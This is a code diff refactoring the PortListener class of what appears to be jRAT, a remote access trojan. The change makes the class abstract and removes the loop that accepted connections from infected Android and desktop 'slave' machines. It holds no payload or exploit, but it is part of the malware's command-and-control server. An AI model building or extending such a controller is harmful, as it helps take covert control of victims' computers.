@@ -1,31 +1,42 @@
 package se.jrat.client.net;
 
 import java.net.ServerSocket;
-import java.net.Socket;
 import java.util.ArrayList;
 import java.util.List;
 
-import se.jrat.client.AbstractSlave;
-import se.jrat.client.Main;
-import se.jrat.client.Slave;
-import se.jrat.client.android.AndroidSlave;
-import se.jrat.client.exceptions.CloseException;
-import se.jrat.client.ui.panels.PanelMainLog;
+import se.jrat.client.settings.Sockets;
 import se.jrat.client.ui.panels.PanelMainSockets;
-import se.jrat.common.ConnectionCodes;
 
-
-public class PortListener implements Runnable {
-
+public abstract class PortListener {
+	
 	public static List<PortListener> listeners = new ArrayList<PortListener>();
-
-	private ServerSocket server;
-	private int timeout = 15 * 1000;
-	private boolean listening = false;
-	private String pass;
-	private String name;
-	private int port;
-
+	
+	public static final int TYPE = Sockets.SocketType.NORMAL_SOCKET;
+	
+	protected ServerSocket server;
+	protected int timeout = 15 * 1000;
+	protected boolean listening = false;
+	protected String pass;
+	protected String name;
+	protected int port;
+	protected int type;
+	
+	public PortListener(String name, int port, int timeout, String pass, int type) throws Exception {		
+		this.name = name;
+		this.port = port;
+		this.timeout = timeout;
+		this.pass = pass;
+		this.type = type;
+		listeners.add(this);
+		
+		try {
+			this.server = new ServerSocket(port);
+		} catch (Exception ex) {
+			ex.printStackTrace();
+			PanelMainSockets.instance.getModel().addRow(new Object[] { "Not listening", name, port, timeout, pass });
+		}
+	}
+	
 	public ServerSocket getServer() {
 		return server;
 	}
@@ -49,64 +60,14 @@ public class PortListener implements Runnable {
 	public int getPort() {
 		return port;
 	}
-
-	public PortListener(String name, int port, int timeout, String pass) throws Exception {
-		listeners.add(this);
-		this.name = name;
-		this.timeout = timeout;
-		this.pass = pass;
-		this.port = port;
-		try {
-			this.server = new ServerSocket(port);
-		} catch (Exception ex) {
-			ex.printStackTrace();
-			PanelMainSockets.instance.getModel().addRow(new Object[] { "Not listening", name, port, timeout, pass });
-		}
-	}
-
-	@Override
-	public void run() {
-		try {
-			while (!server.isClosed()) {
-				Socket socket = server.accept();
-				
-				int type = socket.getInputStream().read();
-				
-				AbstractSlave slave;
-				
-				if (type == ConnectionCodes.ANDROID_SLAVE) {
-					slave = new AndroidSlave(this, socket);
-				} else if (type == ConnectionCodes.DESKTOP_SLAVE) {
-					slave = new Slave(this, socket);
-				}
-								
-				if (type < 0 || type > 1) {
-					slave = new Slave(this, socket);
-					PanelMainLog.getInstance().addEntry("Error", slave, "Invalid connection type");
-					continue;
-				}
-
-				if (Main.liteVersion && Main.connections.size() >= 5) {
-					slave = new Slave(this, socket);
-					slave.closeSocket(new CloseException("Maximum of 5 connections reached"));
-					PanelMainLog.getInstance().addEntry("Warning", slave, "Maximum of 5 connections reached");
-					continue;
-				}
-			}
-		} catch (Exception ex) {
-			ex.printStackTrace();
-		}
-	}
-
-	public void start() {
-		PanelMainSockets.instance.getModel().addRow(new Object[] { "Listening", name, server.getLocalPort(), timeout, pass });
-
-		new Thread(this, "Port " + server.getLocalPort()).start();
+	
+	public int getType() {
+		return type;
 	}
 
 	public static PortListener getListener(String name, int port, int timeout, String pass) {
-		for (int i = 0; i < listeners.size(); i++) {
-			PortListener con = listeners.get(i);
+		for (int i = 0; i < PortListener.listeners.size(); i++) {
+			PortListener con = PortListener.listeners.get(i);
 			if (con.name.equals(name) && con.pass.equals(pass) && con.port == port && con.getTimeout() == timeout) {
 				return con;
 			}
@@ -116,8 +77,8 @@ public class PortListener implements Runnable {
 	}
 
 	public static PortListener getListener(String name) {
-		for (int i = 0; i < listeners.size(); i++) {
-			PortListener con = listeners.get(i);
+		for (int i = 0; i < PortListener.listeners.size(); i++) {
+			PortListener con = PortListener.listeners.get(i);
 			if (con.name.equals(name)) {
 				return con;
 			}
@@ -125,5 +86,4 @@ public class PortListener implements Runnable {
 
 		return null;
 	}
-
 }
